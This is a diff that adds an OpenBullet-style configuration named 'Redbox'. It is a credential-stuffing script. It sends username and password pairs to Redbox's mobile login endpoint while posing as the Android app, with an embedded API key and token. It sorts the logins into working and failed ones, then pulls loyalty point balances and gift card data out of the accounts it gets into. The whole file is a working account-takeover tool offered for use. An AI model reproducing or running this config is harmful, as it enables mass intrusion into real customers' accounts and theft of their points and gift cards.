@@ -1,0 +1,84 @@
+[SETTINGS]
+{
+  "Name": "Redbox",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-08-10T22:10:51.2479291-05:00",
+  "AdditionalInfo": "",
+  "Author": "P6AK",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://mobile.redbox.com/api/account/loginformobile" 
+  CONTENT "{\"createPersistentCookie\":true,\"mobile\":true,\"movieTrackerEnabled\":true,\"password\":\"<PASS>\",\"perks\":true,\"cardData\":true,\"creditData\":true,\"giftCardData\":true,\"userName\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: DroidRBMobile/9500|SAMSUNG_SM-N950W|Smartphone_5.7_in|LOLLIPOP_MR1_5.1.1" 
+  HEADER "X-Redbox-ApiKey: AE674D10-D29B-4587-82DA-0DD3A48F8CAA" 
+  HEADER "X-Redbox-Time: 1592303060" 
+  HEADER "X-Device-ID: e9567919-8a13-33af-bbe5-54d1d26ef64f" 
+  HEADER "X-Redbox-ActivityId: f81ee271-faa6-4cb6-8981-caedd5c08064" 
+  HEADER "X-Redbox-Token: MrR82IQhWX4MJQSFy1zv5DRefx/fnj/3ZH8Dzhcnghs=" 
+  HEADER "X-Redbox-App-Version: 9.50.0" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "Content-Length: 195" 
+  HEADER "Host: mobile.redbox.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+
+PARSE "<SOURCE>" JSON "loyaltyPointBalance" CreateEmpty=FALSE -> CAP "Points:" "" " " 
+
+PARSE "<SOURCE>" LR "giftCards\":[" "]" CreateEmpty=FALSE -> CAP "Giftcards:" "" " " 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Points:>" Contains "0" 
+  KEYCHAIN Success OR 
+    KEY "<Points:>" GreaterThan "0" 
+
